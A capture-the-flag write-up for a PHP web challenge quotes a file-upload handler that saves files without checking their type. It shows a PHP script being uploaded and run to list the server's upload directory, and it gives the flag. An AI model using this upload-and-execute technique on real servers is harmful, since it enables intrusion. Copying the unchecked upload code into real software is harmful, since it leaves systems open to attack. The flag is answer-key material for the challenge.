# WTF PHP

Web<br/>
254 solves, 269 pts<br/>

### Description
````
Your php function didnt work? maybe some info will help you xD 
PS: Flag is somewhere in /etc
Note: This chall does not require any brute forcing
````
[Link](http://wtf-php.darkarmy.xyz/)



### Solution
First, viewing the source code shows us PHP code enclosed in a HTML comment.
````PHP
if(isset($_FILES['fileData'])){
  if($_FILES['fileData']['size'] > 1048576){
     $errors='File size should be less than 1 MB';
  }

  if(empty($errors)==true){
    $uploadedPath = "uploads/".rand().".".explode(".",$_FILES['fileData']['name'])[1];
    move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
    echo "File uploaded successfully\n";
    echo '<p><a href='. $uploadedPath .' target="_blank">File</a></p>';
  }else{
     echo $errors;
  }
}
````
After we upload any file, we are able to click on a generated link to go to the file<br/>
The file is always located in /uploads/(random-numbers).(file-extention)<br/>
However, when we try visitng [/uploads/](http://wtf-php.darkarmy.xyz/uploads/) directly from our browser, we are notified that we do not have permission to access it<br/>
Hence, let us upload a PHP payload to generate a list of all the available files in the /uploads/ directory<br/>
````
<?php
    $dirs = glob('*');
    print_r($dirs);
?>
````
Uploading it gives us all the files in the /uploads/ directory<br/>
We visit the first file in the array, and viola, we have found the flag!<br/>
> darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}
